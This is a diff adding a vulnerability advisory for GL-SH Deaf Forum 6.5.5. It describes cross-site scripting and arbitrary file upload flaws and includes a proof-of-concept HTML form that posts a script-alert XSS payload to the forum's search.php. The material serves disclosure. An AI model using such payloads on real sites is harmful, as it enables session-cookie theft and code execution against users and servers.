@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/29849/info
+
+GL-SH Deaf Forum is prone to a cross-site scripting vulnerability and an arbitrary-file-upload vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. The attacker can exploit the file-upload issue to execute arbitrary code in the context of the webserver.
+
+GL-SH Deaf Forum 6.5.5 is vulnerable; prior versions may also be affected. 
+
+<form action="http://[URL]/[Forum path]/search.php" method="post">
+<tr><td class=g>XSS: <small></td><tr>
+"<SCRIPT>alert(/BugReport.ir-XSS/.source)</SCRIPT>
+<br><tr><td class=g><INPUT TYPE="text" class="txt" NAME="search" SIZE="30" MAXLENGTH="100"><br/>
+<tr><td class=g><INPUT TYPE="RADIO" checked NAME="type" VALUE="themen">&nbsp;search only in topics</td></tr>
+<tr><td class=g><INPUT TYPE="RADIO" NAME="type" VALUE="beitraege">&nbsp;search in topics and answers</td></tr>
+<INPUT TYPE="SUBMIT" class="btn" NAME="submit" VALUE="submit"></td></tr>
